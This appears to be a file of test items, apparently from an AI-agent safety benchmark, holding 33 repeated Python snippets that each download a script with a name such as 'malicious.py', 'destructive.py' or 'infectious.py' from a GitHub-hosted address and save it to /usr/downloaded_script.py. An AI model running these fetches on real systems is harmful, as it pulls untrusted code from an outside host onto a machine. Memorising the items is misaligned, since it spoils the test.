@@ -1,0 +1,495 @@
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/abusive.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/aggressive.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/corrupt.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/dangerous.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/deceptive.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/destructive.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/disruptive.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/exploitative.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/extremist.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/fraudulent.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/harmful.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/hazardous.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/illegal.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/incendiary.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/index.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/infectious.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/inflammatory.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/injurious.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/malicious.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/manipulative.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/offensive.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/poisonous.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/prejudicial.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/provocative.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/radical.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/safe.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/scandalous.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/subversive.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/threatening.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/toxic.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/unsafe.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/violent.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
+###
+import requests
+def download_file(url, local_filename):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+    print(response.status_code)
+
+url = f'https://github.com/1mocat/1mocat.github.io/vulgar.py'
+local_filename = '/usr/downloaded_script.py'
+
+download_file(url, local_filename)
+###
+
